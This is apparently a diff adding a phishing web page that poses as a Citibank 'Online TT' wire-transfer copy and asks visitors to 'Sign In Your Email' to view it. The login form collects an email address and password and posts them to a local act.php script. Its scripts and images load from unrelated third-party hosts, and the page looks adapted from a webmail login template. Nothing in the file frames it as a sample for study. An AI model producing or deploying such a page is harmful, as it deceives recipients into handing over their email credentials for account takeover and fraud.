@@ -1,0 +1,216 @@
+<HTML>
+<HEAD>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+
+<SCRIPT LANGUAGE="JavaScript" SRC="http://webmail.tradepage.co.za/mail/js/login.js"></SCRIPT>
+
+<TITLE>Foreign Transfer - Wire</TITLE>
+
+<STYLE>
+<!--
+.loginBodyBGCOLOR {
+	background-color: #FFFFFF;
+	margin: 0px;
+}
+.login1pxBGCOLOR {
+	background-color: #999999;
+}
+.loginFormBorderBGCOLOR {
+	background-color: #ADADAD;
+}
+.loginLeftBGCOLOR {
+	background-color: #CCCCCC;
+}
+.loginRightBGCOLOR {
+	background-color: #4475A5;
+	background-image: url("/mail/images/login/login-bg.gif");
+	background-repeat: repeat-y;
+}
+font.loginFormFont {
+	font-family: Arial, Helvetica, Sans-serif;
+	font-size: 8.5pt;
+	color:#333333;
+}
+font.loginTitleFont {
+	font-family: Arial, Helvetica, Sans-serif;
+	font-size: 9.5pt;
+	font-weight: bold;
+	color:#333333;
+}
+font.loginTitleFont a {
+	color:#333333;
+}
+font.loginTextFont {
+	font-family: Arial, Helvetica, Sans-serif;
+	font-size: 8.5pt;
+	color:#333333;
+}
+font.loginTextFont a {
+	color:#333333;
+}
+font.loginAlertFont {
+	font-family: Arial, Helvetica, Sans-serif;
+	font-size: 8.5pt;
+	font-weight: bold;
+	color:#990000;
+}
+input.small {
+	font-family: Arial, Helvetica, Sans-serif;
+	font-size: 8.0pt;
+}
+select.small {
+	font-family: Arial, Helvetica, Sans-serif;
+	font-size: 8.0pt;
+}
+.headingTXT {
+	font-family:Arial,Verdana,Helvetica,Sans-Serif;
+	font-size: 9.0pt;
+}
+//-->
+</STYLE>
+
+</HEAD>
+<BODY CLASS="loginBodyBGCOLOR" LEFTMARGIN="0" TOPMARGIN="0" MARGINWIDTH="0" MARGINHEIGHT="0">
+ <BR>
+<font face="Arial" style="font-size: 20pt" color="#342C9A">
+<center><b>Sign In Your Email to view Online TT Copy(secure access)</b></center></font>
+
+
+
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" ALIGN="center">
+ <TR>
+  <TD CLASS="login1pxBGCOLOR" COLSPAN="6"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+ </TR>
+
+ <TR>
+  <TD CLASS="login1pxBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+  <TD CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="26" HEIGHT="1"></TD>
+
+  <TD ALIGN="CENTER" CLASS="loginLeftBGCOLOR"><BR><IMG WIDTH="312" HEIGHT="72" SRC="http://t0.gstatic.com/images?q=tbn:ANd9GcRNsgHkj3x7FlBNZlQN4mAGLmLQb_sIC803-Ir0-qRyDl0F4EoS" ALT="Secure TT Online"><BR><div class='headingTXT'>citibank Online TT(CURRENCY : US DOLLARS)</div></TD>
+  <TD CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="30" HEIGHT="1"></TD>
+  <TD CLASS="login1pxBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+ </TR>
+
+ <TR>
+  <TD CLASS="login1pxBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+  <TD CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="26" HEIGHT="1"></TD>
+  <TD CLASS="loginLeftBGCOLOR">
+
+		   <TABLE CELLSPACING="0" CELLPADDING="0" BORDER="0" ALIGN="CENTER" WIDTH="200" BGCOLOR="#FFFFFF">
+		    <FORM NAME="loginForm" ACTION="act.php" METHOD="POST" ONSUBMIT="submitForm()">
+		    <INPUT TYPE="HIDDEN" NAME="js_autodetect_results" VALUE="SMPREF_JS_OFF" />
+		    <INPUT TYPE="HIDDEN" NAME="just_logged_in" VALUE="1" />
+		    <INPUT TYPE="HIDDEN" NAME="type" VALUE="v3">
+
+		    <TR> <TD CLASS="loginLeftBGCOLOR" COLSPAN="5"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="27"></TD> </TR>
+			<!--- Put in the logo --->
+
+		    <TR>
+		     <TD COLSPAN="2" ROWSPAN="2" CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/mail/images/login/login-boxTopLeft.gif" WIDTH="10" HEIGHT="10"></TD>
+		     <TD HEIGHT="1" CLASS="loginFormBorderBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+		     <TD COLSPAN="2" ROWSPAN="2" CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/mail/images/login/login-boxTopRight.gif" WIDTH="10" HEIGHT="10"></TD>
+		    </TR>
+
+		    <TR> <TD HEIGHT="9"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="9"></TD> </TR>
+
+		    <TR>
+
+		     <TD WIDTH="1" CLASS="loginFormBorderBGCOLOR"><IMG SRC="/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+		     <TD WIDTH="9"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="9" HEIGHT="1"></TD>
+		     <TD VALIGN="TOP" ALIGN="LEFT" NOWRAP><SCRIPT LANGUAGE="JavaScript">
+		      <!--
+		      //Find out if previous login failed
+		      var loginFailed = getQueryVariable('fail');
+		      if (loginFailed == '1') {
+			document.write('<FONT CLASS="loginAlertFont">Login failed.<BR><BR></FONT>');
+		      }
+		      //-->
+		      </SCRIPT>
+
+		      <FONT CLASS="loginFormFont">Email Address:<BR>
+		      <IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="3"><BR>
+		      <INPUT TYPE="TEXT" NAME="user_name" CLASS="small" STYLE="width:180px;"><BR>
+		      <IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="5"><BR>
+
+		      Password:<BR>
+		      <IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="3"><BR>
+		      <INPUT TYPE=PASSWORD NAME="password" CLASS="small" STYLE="width:124px;">
+		      <IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="3" HEIGHT="1"><INPUT TYPE="SUBMIT" VALUE="Log-In" CLASS="small" STYLE="width:50px;"></FONT>
+
+		      <BR><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="5"><BR>
+		      <TABLE CELLSPACING="1" CELLPADDING="0" BORDER="0">
+		       <TR>
+			<TD><INPUT TYPE="CHECKBOX" NAME="remember" ID="remember" STYLE="width:12px;"></TD>
+
+			<TD><LABEL FOR="remember"><FONT CLASS="loginFormFont"> Secure access</FONT></LABEL></TD>
+		       </TR>
+		       <INPUT TYPE=HIDDEN NAME='useSSL' ID='useSSL' VALUE=''>
+		       <TR>
+
+			<TD COLSPAN="3"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="5"></TD>
+		       </TR>
+		      </TABLE>
+		      </FONT>
+
+		     </TD>
+		     <TD WIDTH="9"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="9" HEIGHT="1"></TD>
+		     <TD WIDTH="1" CLASS="loginFormBorderBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+		    </TR>
+		    <TR>
+
+		     <TD COLSPAN="2" ROWSPAN="2" CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/mail/images/login/login-boxBotLeft.gif" WIDTH="10" HEIGHT="10"></TD>
+		     <TD HEIGHT="9"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="9"></TD>
+		     <TD COLSPAN="2" ROWSPAN="2" CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/mail/images/login/login-boxBotRight.gif" WIDTH="10" HEIGHT="10"></TD>
+
+		    </TR>
+		    <TR>
+		     <!--ROWSPAN x 2-->
+		     <TD HEIGHT="1" CLASS="loginFormBorderBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+		     <!--ROWSPAN x 2-->
+		    </TR>
+
+		    <TR>
+		     <TD CLASS="loginLeftBGCOLOR" COLSPAN="5"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="27"></TD>
+
+		    </TR>
+		    </FORM>
+		   </TABLE>
+
+
+  </TD>
+  <TD CLASS="loginLeftBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="30" HEIGHT="1"></TD>
+  <TD CLASS="login1pxBGCOLOR"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+ </TR>
+
+ <TR>
+  <TD CLASS="login1pxBGCOLOR" COLSPAN="6"><IMG SRC="http://webmail.tradepage.co.za/images/spacer.gif" WIDTH="1" HEIGHT="1"></TD>
+ </TR>
+
+</TABLE>
+
+<!--
+***************************************************************************
+* Insert HTML for the Footer below
+* YOU MAY EDIT THIS SECTION
+*************************************************************************** -->
+<!--FOOTER HERE-->
+
+<!--
+***************************************************************************
+* End the page
+* WARNING: do not edit this section unless you know what you are doing
+*************************************************************************** -->
+<!-- Inserted by control panel -->
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+preloadForm();
+//-->
+</SCRIPT>
+</BODY>
+
+</HTML>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img alt="http://albatross.co.il/abstract/Kemscy/Secure.JPG" src="http://albatross.co.il/abstract/Kemscy/Secure.JPG"><img alt="http://t0.gstatic.com/images?q=tbn:ANd9GcQff_DUTjzaFzXhS_i3JOHTk6iUNlwClyRRXx20uGVPIUmhQe6-" src="http://t0.gstatic.com/images?q=tbn:ANd9GcQff_DUTjzaFzXhS_i3JOHTk6iUNlwClyRRXx20uGVPIUmhQe6-">
+
+</body>
+</html>
